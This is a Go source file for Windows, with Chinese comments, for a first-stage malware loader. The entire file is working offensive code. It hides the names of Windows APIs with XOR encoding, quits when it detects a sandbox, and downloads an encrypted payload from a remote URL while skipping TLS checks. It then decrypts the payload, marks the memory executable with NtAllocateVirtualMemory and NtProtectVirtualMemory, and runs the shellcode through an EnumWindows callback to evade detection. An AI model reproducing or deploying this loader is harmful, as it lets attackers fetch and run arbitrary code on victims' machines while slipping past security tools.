//go:build windows

package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Stager: 第一阶段加载器
// 使用XOR加密API名 + EnumWindows回调执行

// XOR解密
func xd(data []byte, key byte) string {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key
	}
	return string(out)
}

const xk byte = 0x37

// 加密的DLL名和API名
var (
	eK32 = []byte{0x5c, 0x52, 0x45, 0x59, 0x52, 0x5b, 0x04, 0x05, 0x19, 0x53, 0x5b, 0x5b} // kernel32.dll
	eNt  = []byte{0x59, 0x43, 0x53, 0x5b, 0x5b, 0x19, 0x53, 0x5b, 0x5b}                   // ntdll.dll
	eU32 = []byte{0x42, 0x44, 0x52, 0x45, 0x04, 0x05, 0x19, 0x53, 0x5b, 0x5b}             // user32.dll

	eNAVM = []byte{0x79, 0x43, 0x76, 0x5b, 0x5b, 0x58, 0x54, 0x56, 0x43, 0x52, 0x61, 0x5e, 0x45, 0x43, 0x42, 0x56, 0x5b, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e} // NtAllocateVirtualMemory
	eNPVM = []byte{0x79, 0x43, 0x67, 0x45, 0x58, 0x43, 0x52, 0x54, 0x43, 0x61, 0x5e, 0x45, 0x43, 0x42, 0x56, 0x5b, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e}       // NtProtectVirtualMemory
	eRCM  = []byte{0x65, 0x43, 0x5b, 0x74, 0x58, 0x47, 0x4e, 0x7a, 0x52, 0x5a, 0x58, 0x45, 0x4e}                                                             // RtlCopyMemory
	eGTC  = []byte{0x70, 0x52, 0x43, 0x63, 0x5e, 0x54, 0x5c, 0x74, 0x58, 0x42, 0x59, 0x43, 0x01, 0x03}                                                       // GetTickCount64
	eEW   = []byte{0x72, 0x59, 0x42, 0x5a, 0x60, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44}                                                                         // EnumWindows
)

const (
	memCommit  = 0x1000
	memReserve = 0x2000
	pageRW     = 0x04
	pageRX     = 0x20
)

var downloadURL string

func main() {
	if antiSandbox() {
		os.Exit(0)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}

	var payload []byte
	for {
		resp, err := client.Get(downloadURL)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		if resp.StatusCode == 200 {
			data, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				time.Sleep(5 * time.Second)
				continue
			}
			payload = data
			break
		}
		resp.Body.Close()
		time.Sleep(5 * time.Second)
	}

	key := getDecryptKey()
	for i, b := range payload {
		payload[i] = b ^ key
	}

	// NtAllocateVirtualMemory (API名XOR加密)
	ntAVM := syscall.NewLazyDLL(xd(eNt, xk)).NewProc(xd(eNAVM, xk))
	var baseAddr uintptr
	regionSize := uintptr(len(payload))
	ntAVM.Call(^uintptr(0), uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&regionSize)), uintptr(memCommit|memReserve), uintptr(pageRW))
	if baseAddr == 0 {
		os.Exit(1)
	}

	// 写入payload
	for i, b := range payload {
		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = b
	}

	// NtProtectVirtualMemory: RW → RX
	ntPVM := syscall.NewLazyDLL(xd(eNt, xk)).NewProc(xd(eNPVM, xk))
	var oldProt uint32
	ntPVM.Call(^uintptr(0), uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), uintptr(pageRX), uintptr(unsafe.Pointer(&oldProt)))

	// EnumWindows回调执行 (替代syscall.SyscallN)
	enumW := syscall.NewLazyDLL(xd(eU32, xk)).NewProc(xd(eEW, xk))
	enumW.Call(baseAddr, 0)
}

var decryptKeyStr string

func getDecryptKey() byte {
	if decryptKeyStr != "" {
		var k int
		fmt.Sscanf(decryptKeyStr, "%d", &k)
		return byte(k)
	}
	return 0x55
}

func antiSandbox() bool {
	if numCPU() < 2 {
		return true
	}
	uptime := getUptime()
	if uptime < 10*time.Minute {
		return true
	}
	return false
}

func numCPU() int {
	return runtime.NumCPU()
}

func getUptime() time.Duration {
	ret, _, _ := syscall.NewLazyDLL(xd(eK32, xk)).NewProc(xd(eGTC, xk)).Call()
	return time.Duration(ret) * time.Millisecond
}
